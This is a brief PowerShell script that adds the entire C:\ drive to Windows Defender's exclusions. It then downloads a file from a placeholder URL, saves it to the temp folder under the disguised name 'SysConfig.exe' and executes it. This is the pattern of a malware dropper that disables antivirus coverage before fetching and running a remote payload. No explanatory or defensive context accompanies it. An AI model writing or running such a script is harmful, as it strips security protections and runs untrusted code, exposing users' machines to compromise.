Add-MpPreference -ExclusionPath C:\
$url = "asd763"
$out = "$env:Temp\SysConfig.exe"
Invoke-WebRequest -Uri $url -OutFile $out 
Start-Process -FilePath $out
